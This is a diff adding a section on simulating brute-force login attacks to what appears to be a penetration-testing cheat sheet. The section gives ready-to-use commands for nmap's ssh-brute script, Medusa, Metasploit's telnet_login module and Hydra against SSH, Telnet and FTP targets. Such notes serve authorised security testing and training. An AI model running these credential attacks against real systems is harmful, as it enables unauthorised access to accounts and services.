@@ -139,3 +139,32 @@ use 4
 set RHOSTS <target_IP>
 set PASSWORD Public
 Run
+
+
+### 7. Simulating Brute-Force Attacks on SSH, Telnet, FTP:
+**SSH Brute Forcing using nmap**:
+```
+nmap -p 22 --script=ssh-brute --script-args userdb=pass.txt,passdb=pass.txt <target_TP>
+```
+
+**SSH Brute Forcing using Medusa**:
+```
+medusa -h <target_IP> -U file.txt -P file.txt -M ssh
+```
+
+**Telnet Brute Forcing using Metasploit Framework**:
+```
+use auxiliary/scanner/telnet/telnet_login
+Options
+set RHOSTS <target_IP>
+set USER_FILE pass.txt
+set PASS_FILE pass.txt
+set STOP_ON_SUCESS true
+run
+```
+
+**FTP Brute Forcing using Hydra:**
+```
+hydra -L file.txt -P file.txt ftp:<target_IP>
+```
+
